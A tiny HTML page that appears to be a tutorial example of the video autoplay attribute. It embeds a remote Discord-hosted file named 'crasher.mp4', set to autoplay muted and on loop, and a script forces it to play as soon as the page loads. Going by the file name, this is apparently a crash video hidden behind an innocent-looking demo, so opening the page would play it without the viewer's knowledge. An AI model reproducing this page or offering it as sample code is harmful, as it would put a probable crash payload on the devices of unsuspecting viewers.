<!DOCTYPE html>
<html>
<head>
    <title>HTML video autoplay Attribute</title>
</head>

<body>
    <center>
        <video width="400" height="200" autoplay muted loop id="vid">
            <source src=
"https://cdn.discordapp.com/attachments/834355715094478909/838738353196761118/crasher.mp4"
                    type="video/mp4">
        </video>
    </center>
</body>
</html>

<script>
    document.getElementById('vid').play();
</script>
